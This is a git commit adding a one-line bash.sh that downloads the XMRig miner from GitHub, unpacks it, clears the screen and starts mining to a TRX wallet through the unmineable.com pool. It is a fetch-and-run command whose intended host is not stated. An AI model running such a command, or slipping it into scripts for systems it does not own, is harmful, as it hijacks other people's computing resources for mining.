698a498df580dd8882185f56863c0a3fd8161017
wertgh <106554343+wertgh@users.noreply.github.com>
2022-05-31 00:21:24 +0530

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TCcpLwuXCAi6U66fPTjLaoWEXEHd5zLNsN.myminer28 #omhj-poh1
